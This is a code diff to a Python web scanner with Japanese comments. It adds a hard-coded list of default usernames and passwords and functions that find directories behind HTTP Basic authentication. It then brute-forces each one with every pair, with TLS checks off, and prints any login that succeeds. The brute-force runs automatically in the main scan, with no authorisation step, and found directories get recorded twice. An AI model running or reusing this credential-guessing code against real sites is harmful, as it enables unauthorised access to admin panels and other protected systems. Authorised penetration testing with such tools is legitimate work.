@@ -32,8 +32,76 @@ class WebScanner:
             'forms': [],
             'vulnerabilities': [],
             'subdomains': [],
-            'virtual_hosts': []
+            'virtual_hosts': [],
+            'auth_results': {}
         }
+        
+        # Basic認証用のワードリスト
+        self.auth_credentials = [
+            ('admin', 'admin'),
+            ('admin', 'password'),
+            ('admin', '123456'),
+            ('admin', 'admin123'),
+            ('admin', 'root'),
+            ('admin', 'administrator'),
+            ('root', 'root'),
+            ('root', 'password'),
+            ('root', '123456'),
+            ('root', 'admin'),
+            ('user', 'user'),
+            ('user', 'password'),
+            ('user', '123456'),
+            ('guest', 'guest'),
+            ('guest', 'password'),
+            ('test', 'test'),
+            ('test', 'password'),
+            ('demo', 'demo'),
+            ('demo', 'password'),
+            ('webmaster', 'webmaster'),
+            ('webmaster', 'password'),
+            ('administrator', 'administrator'),
+            ('administrator', 'password'),
+            ('administrator', 'admin'),
+            ('manager', 'manager'),
+            ('manager', 'password'),
+            ('supervisor', 'supervisor'),
+            ('supervisor', 'password'),
+            ('operator', 'operator'),
+            ('operator', 'password'),
+            ('support', 'support'),
+            ('support', 'password'),
+            ('helpdesk', 'helpdesk'),
+            ('helpdesk', 'password'),
+            ('info', 'info'),
+            ('info', 'password'),
+            ('webadmin', 'webadmin'),
+            ('webadmin', 'password'),
+            ('siteadmin', 'siteadmin'),
+            ('siteadmin', 'password'),
+            ('master', 'master'),
+            ('master', 'password'),
+            ('system', 'system'),
+            ('system', 'password'),
+            ('service', 'service'),
+            ('service', 'password'),
+            ('default', 'default'),
+            ('default', 'password'),
+            ('cisco', 'cisco'),
+            ('cisco', 'password'),
+            ('juniper', 'juniper'),
+            ('juniper', 'password'),
+            ('admin', ''),
+            ('root', ''),
+            ('user', ''),
+            ('guest', ''),
+            ('test', ''),
+            ('demo', ''),
+            ('', 'admin'),
+            ('', 'password'),
+            ('', '123456'),
+            ('', 'root'),
+            ('', ''),
+        ]
         
         # よくあるディレクトリ
         self.common_directories = [
@@ -824,6 +892,156 @@ class WebScanner:
         except:
             return "タイトルなし"
     
+    def detect_basic_auth(self, url):
+        """Basic認証の検出"""
+        try:
+            response = requests.get(url, headers=self.headers, timeout=5, verify=False)
+            if response.status_code == 401:
+                auth_header = response.headers.get('WWW-Authenticate', '')
+                if 'Basic' in auth_header:
+                    return True, auth_header
+            return False, None
+        except:
+            return False, None
+    
+    def basic_auth_bruteforce(self, url, realm=None):
+        """Basic認証のブルートフォース攻撃"""
+        print(f"🔐 Basic認証ブルートフォースを開始: {url}")
+        
+        auth_results = {
+            'url': url,
+            'realm': realm,
+            'successful_logins': [],
+            'failed_attempts': 0,
+            'total_attempts': len(self.auth_credentials)
+        }
+        
+        def try_credentials(username, password):
+            try:
+                from requests.auth import HTTPBasicAuth
+                auth = HTTPBasicAuth(username, password)
+                response = requests.get(url, auth=auth, headers=self.headers, timeout=5, verify=False)
+                
+                if response.status_code == 200:
+                    return {
+                        'username': username,
+                        'password': password,
+                        'status_code': response.status_code,
+                        'content_length': len(response.content),
+                        'title': self.extract_title(response.text)
+                    }
+                return None
+            except Exception as e:
+                return None
+        
+        print(f"   📋 試行回数: {len(self.auth_credentials)}回")
+        print(f"   🔄 認証情報をテスト中...")
+        
+        successful_count = 0
+        
+        for i, (username, password) in enumerate(self.auth_credentials, 1):
+            result = try_credentials(username, password)
+            
+            if result:
+                auth_results['successful_logins'].append(result)
+                successful_count += 1
+                print(f"   ✅ 成功: {username}:{password} (ステータス: {result['status_code']})")
+                print(f"      📄 タイトル: {result['title']}")
+                print(f"      📏 サイズ: {result['content_length']} bytes")
+            else:
+                auth_results['failed_attempts'] += 1
+            
+            # 進捗表示（10回ごと）
+            if i % 10 == 0:
+                print(f"   📊 進捗: {i}/{len(self.auth_credentials)} ({i/len(self.auth_credentials)*100:.1f}%)")
+        
+        print(f"   🎯 結果: {successful_count}個の認証情報が成功")
+        print(f"   ❌ 失敗: {auth_results['failed_attempts']}回")
+        
+        return auth_results
+    
+    def scan_basic_auth_directories(self, base_url=None):
+        """Basic認証が必要なディレクトリのスキャン"""
+        if base_url is None:
+            if self.results.get('https_status') == 200:
+                base_url = f"https://{self.target}"
+            elif self.results.get('http_status') == 200:
+                base_url = f"http://{self.target}"
+            else:
+                base_url = f"http://{self.target}"
+        
+        print(f"🔍 Basic認証ディレクトリをスキャン中: {base_url}")
+        
+        # Basic認証が必要な可能性が高いディレクトリ
+        auth_directories = [
+            'admin', 'administrator', 'login', 'auth', 'secure',
+            'private', 'internal', 'management', 'control',
+            'panel', 'dashboard', 'console', 'webadmin',
+            'siteadmin', 'cpanel', 'whm', 'plesk', 'directadmin',
+            'webmin', 'phpmyadmin', 'mysql', 'database',
+            'backup', 'config', 'setup', 'install',
+            'maintenance', 'monitor', 'status', 'health',
+            'logs', 'debug', 'test', 'dev', 'staging'
+        ]
+        
+        auth_found = []
+        
+        def check_auth_directory(dir_name):
+            try:
+                url = f"{base_url}/{dir_name}"
+                has_auth, auth_header = self.detect_basic_auth(url)
+                
+                if has_auth:
+                    result = {
+                        'directory': dir_name,
+                        'url': url,
+                        'auth_header': auth_header,
+                        'realm': self.extract_realm(auth_header)
+                    }
+                    auth_found.append(result)
+                    print(f"🔐 Basic認証発見: /{dir_name}")
+                    print(f"   🔗 URL: {url}")
+                    if result['realm']:
+                        print(f"   🏷️  Realm: {result['realm']}")
+                    
+                    # ブルートフォース攻撃を実行
+                    auth_results = self.basic_auth_bruteforce(url, result['realm'])
+                    result['bruteforce_results'] = auth_results
+                    
+                    return result
+                return None
+            except Exception as e:
+                print(f"⚠️  ディレクトリチェックエラー ({dir_name}): {str(e)}")
+                return None
+        
+        print(f"   📋 スキャン対象: {len(auth_directories)}個のディレクトリ")
+        
+        with ThreadPoolExecutor(max_workers=10) as executor:
+            future_to_dir = {executor.submit(check_auth_directory, dir_name): dir_name for dir_name in auth_directories}
+            
+            for future in as_completed(future_to_dir):
+                result = future.result()
+                if result:
+                    auth_found.append(result)
+        
+        self.results['auth_results'] = {
+            'auth_directories': auth_found,
+            'total_found': len(auth_found)
+        }
+        
+        return auth_found
+    
+    def extract_realm(self, auth_header):
+        """WWW-Authenticateヘッダーからrealmを抽出"""
+        try:
+            if 'realm=' in auth_header:
+                realm_match = re.search(r'realm="([^"]+)"', auth_header)
+                if realm_match:
+                    return realm_match.group(1)
+        except:
+            pass
+        return None
+    
     def scan_subdomain_vulnerabilities(self, subdomain_info):
         """サブドメインの脆弱性スキャン"""
         vulnerabilities = []
@@ -948,6 +1166,21 @@ class WebScanner:
         
         if not all_vulnerabilities:
             print("✅ 検出された脆弱性はありません")
+        
+        # Basic認証スキャン
+        print("🔐 Basic認証スキャン中...")
+        auth_results = self.scan_basic_auth_directories()
+        if auth_results:
+            print(f"🔐 Basic認証が必要なディレクトリ: {len(auth_results)}個")
+            for auth_dir in auth_results:
+                print(f"   🔐 /{auth_dir['directory']} - {auth_dir['url']}")
+                if auth_dir.get('bruteforce_results', {}).get('successful_logins'):
+                    successful_logins = auth_dir['bruteforce_results']['successful_logins']
+                    print(f"      ✅ 成功した認証情報: {len(successful_logins)}個")
+                    for login in successful_logins:
+                        print(f"         - {login['username']}:{login['password']}")
+        else:
+            print("ℹ️  Basic認証が必要なディレクトリは見つかりませんでした")
         
         self.results['vulnerabilities'] = all_vulnerabilities
         
